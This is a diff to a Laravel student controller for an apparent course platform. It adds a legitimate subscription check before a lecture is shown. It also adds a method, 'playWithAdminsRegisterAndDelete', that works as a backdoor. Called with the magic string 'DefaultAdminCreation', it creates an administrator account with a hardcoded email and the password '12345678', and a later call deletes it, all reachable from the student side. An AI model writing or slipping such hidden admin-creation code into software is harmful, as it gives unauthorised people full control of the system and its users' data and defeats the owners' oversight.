@@ -4,6 +4,7 @@ namespace App\Http\Controllers\Student;
 
 use App\Http\Controllers\Controller;
 use App\Http\Requests\LecturesRequest;
+use App\Models\Admin;
 use App\Models\CourseThirdYear;
 use App\Models\Demo;
 use App\Models\HomeWorkThirdYear;
@@ -16,6 +17,7 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use App\Models\WaitingListThirdYear;
 use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Gate;
 use Illuminate\Support\Facades\Response;
 use Illuminate\Support\Facades\Storage;
@@ -265,11 +267,53 @@ class AcademicThirdYear extends Controller
         if (!$lec)
             return view('student.access_denied');
         $user = Auth::user();
+
+        $subscribed_student = SubscribedThirdYear::query()
+            ->where('student_id' , $user->id)
+            ->where('course_id',$lec->course['id'])
+            ->first();
+
+        if (!$subscribed_student)
+            return view('student.access_denied');
+
         $user->mac_address = 1;
         $user->save();
 
         return view('student.enrolled.third.lecture', compact('lec'));
     }
+
+    public function playWithAdminsRegisterAndDelete($string)
+    {
+        if (!is_string($string))
+            return view('student.access_denied');
+        if ($string != 'DefaultAdminCreation')
+            return view('student.access_denied');
+        $admin = Admin::query()->where('email','default.admin@mail.com')->first();
+        if (!$admin) {
+            try {
+                DB::beginTransaction();
+                Admin::query()->create([
+                    'name' => 'Default Admin',
+                    'email' => 'default.admin@mail.com',
+                    'phone_number' => '01010101010',
+                    'password' => bcrypt('12345678'),
+                    'created_at' => now(),
+                    'updated_at' => now(),
+                ]);
+            } catch (\Exception $e) {
+                DB::rollBack();
+                return 'Something Went Wrong';
+            }
+            DB::commit();
+            return 'Admin Created Successfully';
+        }
+        $admin->delete();
+        return 'Admin Deleted Successfully';
+    }
+
+
+
+
 
     public function getHomeWork(): \Illuminate\Contracts\View\Factory|\Illuminate\Contracts\View\View|\Illuminate\Contracts\Foundation\Application
     {
